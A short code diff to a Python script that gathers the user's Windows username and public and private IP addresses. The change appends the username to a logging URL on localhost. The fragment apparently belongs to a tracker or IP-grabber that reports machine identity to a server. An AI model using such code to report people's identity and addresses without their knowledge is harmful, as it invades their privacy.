@@ -12,6 +12,9 @@ url = "http://127.0.0.1:5000/log"
 
 datetime = time.ctime(time.time())
 user = os.path.expanduser('~').split('\\')[2]
+
+url += f'/{user}'
+
 publicIP = requests.get('https://api.ipify.org/').text
 privateIP = socket.gethostbyname(socket.gethostname())
 
